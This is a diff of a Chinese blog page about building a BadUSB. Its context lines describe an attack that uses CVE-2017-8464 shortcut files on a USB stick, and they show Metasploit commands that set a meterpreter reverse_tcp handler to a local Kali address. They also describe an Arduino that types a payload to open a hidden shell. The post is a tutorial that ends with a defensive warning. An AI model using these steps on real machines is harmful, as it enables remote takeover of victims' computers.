@@ -3,13 +3,13 @@
   <head>
     <meta charset="utf-8" >
 
-<title>简易BadUSB制作和玩法 | Mari0er&#39;s Blog -</title>
+<title>简易BadUSB制作和玩法 | Mari0er&#39;s Blog</title>
 <meta name="description" content="">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565688135525">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565699410997">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -30,8 +30,8 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1565688135525" class="site-logo">
-        <h1 class="site-title">Mari0er&#39;s Blog -</h1>
+        <img src="https://mari0er.github.io/images/avatar.png?v=1565699410997" class="site-logo">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
         <div class="line"></div>
@@ -114,7 +114,7 @@ msf exploit(cve_2017_8464_lnk_rce) &gt; exploit
 <h2 id="0x02">0x02</h2>
 <p>  生成完文件之后，利用handler模块监听回连的meterpreter。接下来，如果你的U盘插入电脑显示是<strong>F盘</strong>就将带F盘符的快捷方式文件和cpl文件一起放入U盘的根目录(建议多放几个快捷方式文件，说不定有的人电脑都到J盘了)，然后插入电脑就可以触发漏洞并回弹shell。这种方法严格上不能叫做BadUSB,因为这只是简单的利用了Windows的漏洞，生成的文件容易被杀软查杀。<br>
 <strong>注意：</strong> 1.Kali地址--192.168.10.18<br>
-　　　 2.电脑打开自动播放功能可以直接回弹shell，否则需要手动打开U盘才能够回连</p>
+　　　 2.电脑打开自动播放功能可以直接回弹shell，否则需要手动打开U盘才能够回弹</p>
 <pre><code>msf exploit(cve_2017_8464_lnk_rce) &gt; use exploit/multi/handler
 msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
 msf exploit(handler) &gt; set lhost 192.168.10.18
@@ -203,10 +203,10 @@ void loop() {
 }
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0604.png" alt=""></p>
-<p>编译，上传时记得选择开发板类型和端口,上传完成后开发板会自动断开并连接，记得及时拔掉开发板，不然会在主机上输入上述payload。打开隐藏终端时还是会有蓝框闪过，但是时间很短，从插上开发板到完成攻击大概只需要2秒钟。完整效果演示如下<br>
+<p>编译，上传时记得选择开发板类型和端口,上传完成后开发板会自动断开Arduino并连接电脑，记得及时拔掉开发板，不然会在主机上输入上述payload。此时打开隐藏终端时还是会有蓝框闪过，但是时间很短，从插上开发板到完成攻击大概只需要2秒钟。完整效果演示如下<br>
 <img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/BadUSB.gif" alt=""></p>
 <h2 id="0x06">0x06</h2>
-<p>  上述代码只是简单的利用msf获得shell，还有很多其他的玩法，比如<a href="http://www.freebuf.com/articles/100026.html">这篇文章</a>利用BadUSB窃取指定文件,还有<a href="http://www.freebuf.com/articles/terminal/6182.html">这篇文章</a>利用set工具集进行渗透。总之，通过自定义的payload还可以完成更多自己想要的操作。所以，对于来历不明的USB不要轻易插到自己的电脑上，如果必要可以插到自己的虚拟机进行读取操作。</p>
+<p>  上述代码只是简单的利用msf获得shell，还有很多其他的玩法，比如<a href="http://www.freebuf.com/articles/100026.html">这篇文章</a>利用BadUSB窃取指定文件,还有<a href="http://www.freebuf.com/articles/terminal/6182.html">这篇文章</a>利用set工具集进行渗透。总之，通过自定义的payload还可以完成更多自己想要的操作。所以，对于来历不明的USB千万不要轻易插到自己的电脑上，如果必要可以插到自己的虚拟机进行读取操作。</p>
 <blockquote>
 <p>本文作者： Mari0er<br>
 本文链接： https://mari0er.github.io/post/badusb.html<br>
